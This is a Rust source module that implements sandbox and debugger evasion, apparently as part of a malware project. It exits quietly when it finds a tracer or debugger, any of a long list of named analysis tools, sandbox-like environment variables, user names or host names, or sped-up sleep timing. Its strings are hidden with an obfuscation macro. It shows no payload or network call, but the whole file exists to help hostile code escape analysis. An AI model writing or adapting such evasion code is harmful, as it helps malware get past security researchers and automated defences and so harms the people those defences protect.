use encstr::astr;
use std::time::{Duration, Instant};

#[cfg(target_os = "linux")]
use std::fs;
#[cfg(target_os = "linux")]
use std::path::Path;

#[cfg(target_os = "windows")]
use winapi::shared::minwindef::DWORD;
#[cfg(target_os = "windows")]
use winapi::um::debugapi::IsDebuggerPresent;
#[cfg(target_os = "windows")]
use winapi::um::errhandlingapi::SetErrorMode;
#[cfg(target_os = "windows")]
use winapi::um::handleapi::CloseHandle;
#[cfg(target_os = "windows")]
use winapi::um::sysinfoapi::GlobalMemoryStatusEx;
#[cfg(target_os = "windows")]
use winapi::um::sysinfoapi::MEMORYSTATUSEX;
#[cfg(target_os = "windows")]
use winapi::um::tlhelp32::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
};
#[cfg(target_os = "windows")]
use winapi::um::fileapi::GetDiskFreeSpaceExA;
#[cfg(target_os = "windows")]
use winapi::shared::ntdef::ULARGE_INTEGER;

pub fn exit_if_sandboxed() {
    if check_all() {
        #[cfg(target_os = "windows")]
        unsafe {
            SetErrorMode(0);
        }
        std::process::exit(0);
    }
}

fn check_all() -> bool {
    check_debugger()
        || check_analysis_processes()
        || check_sandbox_env_vars()
        || check_sleep_acceleration()
}

fn check_debugger() -> bool {
    #[cfg(target_os = "linux")]
    {
        if let Ok(status) = fs::read_to_string(astr!("/proc/self/status")) {
            for line in status.lines() {
                if line.starts_with(astr!("TracerPid:").as_str()) {
                    let pid = line.trim_start_matches(astr!("TracerPid:").as_str()).trim();
                    if pid != "0" {
                        return true;
                    }
                }
            }
        }
    }

    #[cfg(target_os = "windows")]
    {
        unsafe {
            if IsDebuggerPresent() != 0 {
                return true;
            }
        }
    }

    false
}

#[cfg(target_os = "linux")]
static ANALYSIS_PROCESSES: std::sync::LazyLock<Vec<String>> = std::sync::LazyLock::new(|| vec![
    astr!("wireshark"),
    astr!("tcpdump"),
    astr!("strace"),
    astr!("ltrace"),
    astr!("gdb"),
    astr!("procmon"),
    astr!("procexp"),
    astr!("ftk"),
    astr!("foremost"),
    astr!("volatility"),
    astr!("radare2"),
    astr!("rizin"),
]);

#[cfg(target_os = "windows")]
static ANALYSIS_PROC_W: std::sync::LazyLock<Vec<String>> = std::sync::LazyLock::new(|| vec![
    astr!("wireshark.exe"),
    astr!("procmon.exe"),
    astr!("procmon64.exe"),
    astr!("procexp.exe"),
    astr!("procexp64.exe"),
    astr!("tcpview.exe"),
    astr!("fiddler.exe"),
    astr!("processhacker.exe"),
    astr!("processhacker64.exe"),
    astr!("ida.exe"),
    astr!("ida64.exe"),
    astr!("x64dbg.exe"),
    astr!("x32dbg.exe"),
    astr!("ollydbg.exe"),
    astr!("immunitydebugger.exe"),
    astr!("windbg.exe"),
    astr!("regmon.exe"),
    astr!("filemon.exe"),
    astr!("apimonitor.exe"),
    astr!("apiMonitor.exe"),
    astr!("dumpcap.exe"),
    astr!("python.exe"),
    astr!("python3.exe"),
    astr!("pestry.exe"),
    astr!("peid.exe"),
    astr!("lordpe.exe"),
    astr!("importrec.exe"),
    astr!("petools.exe"),
    astr!("dnspy.exe"),
    astr!("ilspy.exe"),
    astr!("httpanalyzer.exe"),
    astr!("fakenet.exe"),
    astr!("inetsim.exe"),
]);

fn check_analysis_processes() -> bool {
    #[cfg(target_os = "linux")]
    {
        if let Ok(entries) = fs::read_dir(astr!("/proc")) {
            for entry in entries.flatten() {
                let pid = match entry.file_name().to_string_lossy().parse::<u32>() {
                    Ok(n) => n,
                    Err(_) => continue,
                };
                let comm_path = Path::new(&astr!("/proc")).join(pid.to_string()).join(astr!("comm"));
                if let Ok(name) = fs::read_to_string(&comm_path) {
                    let name = name.trim().to_lowercase();
                    if ANALYSIS_PROCESSES.iter().any(|p| name.contains(p.as_str())) {
                        return true;
                    }
                }
            }
        }
    }

    #[cfg(target_os = "windows")]
    {
        unsafe {
            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
                return false;
            }
            let mut entry: PROCESSENTRY32W = std::mem::zeroed();
            entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as DWORD;
            if Process32FirstW(snapshot, &mut entry) != 0 {
                loop {
                    let name = String::from_utf16_lossy(&entry.szExeFile)
                        .trim()
                        .to_lowercase();
                    if ANALYSIS_PROC_W.iter().any(|p| name == *p) {
                        CloseHandle(snapshot);
                        return true;
                    }
                    if Process32NextW(snapshot, &mut entry) == 0 {
                        break;
                    }
                }
            }
            CloseHandle(snapshot);
        }
    }

    false
}

fn check_low_resources() -> bool {
    if let Ok(cores) = std::thread::available_parallelism() {
        if cores.get() <= 2 {
            return true;
        }
    }

    #[cfg(target_os = "linux")]
    {
        if let Ok(meminfo) = fs::read_to_string(astr!("/proc/meminfo")) {
            for line in meminfo.lines() {
                if line.starts_with(astr!("MemTotal:").as_str()) {
                    let kb_str = line
                        .trim_start_matches(astr!("MemTotal:").as_str())
                        .trim()
                        .trim_end_matches(astr!(" kB").as_str());
                    if let Ok(kb) = kb_str.parse::<u64>() {
                        let gb = kb / 1024 / 1024;
                        if gb < 2 {
                            return true;
                        }
                    }
                    break;
                }
            }
        }

        let cpath = std::ffi::CString::new(astr!("/").as_str()).unwrap_or_default();
        let mut stat: libc::statvfs = unsafe { std::mem::zeroed() };
        let ret = unsafe { libc::statvfs(cpath.as_ptr(), &mut stat) };
        if ret == 0 {
            let total_gb = (stat.f_frsize as u64 * stat.f_blocks as u64) / 1024 / 1024 / 1024;
            if total_gb < 60 {
                return true;
            }
        }
    }

    #[cfg(target_os = "windows")]
    {
        unsafe {
            let mut mem: MEMORYSTATUSEX = std::mem::zeroed();
            mem.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as DWORD;
            if GlobalMemoryStatusEx(&mut mem) != 0 {
                let total_gb = mem.ullTotalPhys / 1024 / 1024 / 1024;
                if total_gb < 2 {
                    return true;
                }
            }

            let mut free_bytes: ULARGE_INTEGER = std::mem::zeroed();
            let mut total_bytes: ULARGE_INTEGER = std::mem::zeroed();
            let mut total_free_bytes: ULARGE_INTEGER = std::mem::zeroed();
            let drive = astr!("C:\\\0").as_ptr() as *const i8;
            if GetDiskFreeSpaceExA(
                drive,
                &mut free_bytes,
                &mut total_bytes,
                &mut total_free_bytes,
            ) != 0
            {
                let total = total_bytes.QuadPart();
                let total_gb = total / 1024 / 1024 / 1024;
                if total_gb < 60 {
                    return true;
                }
            }
        }
    }

    false
}

fn check_sandbox_env_vars() -> bool {
    for var in &[
        astr!("SBIE"),
    ] {
        for (key, _) in std::env::vars() {
            let key = key.to_uppercase();
            if key.starts_with(var.as_str()) {
                return true;
            }
        }
    }

    if let Ok(compname) = std::env::var(astr!("COMPUTERNAME")) {
        let lower = compname.to_lowercase();
        if lower.starts_with(astr!("sandbox").as_str()) || lower.starts_with(astr!("malware").as_str()) || lower.starts_with(astr!("virus").as_str()) {
            return true;
        }
    }

    if let Ok(user) = std::env::var(astr!("USER")) {
        let lower = user.to_lowercase();
        if lower.as_str() == astr!("sandbox").as_str() || lower.as_str() == astr!("malware").as_str() || lower.as_str() == astr!("virus").as_str() || lower.as_str() == astr!("currentuser").as_str() {
            return true;
        }
    }

    let hostname = gethostname::gethostname()
        .into_string()
        .unwrap_or_default()
        .to_lowercase();
    if hostname.starts_with(astr!("sandbox").as_str())
        || hostname.starts_with(astr!("malware").as_str())
        || hostname.as_str() == astr!("win-k9rjhohk3p6").as_str()
    {
        return true;
    }

    false
}

fn check_sleep_acceleration() -> bool {
    const TEST_SLEEP_MS: u64 = 2000;
    const TOLERANCE_RATIO: f64 = 0.5;

    let start = Instant::now();
    std::thread::sleep(Duration::from_millis(TEST_SLEEP_MS));
    let elapsed = start.elapsed();

    let ratio = elapsed.as_millis() as f64 / TEST_SLEEP_MS as f64;
    ratio < TOLERANCE_RATIO
}
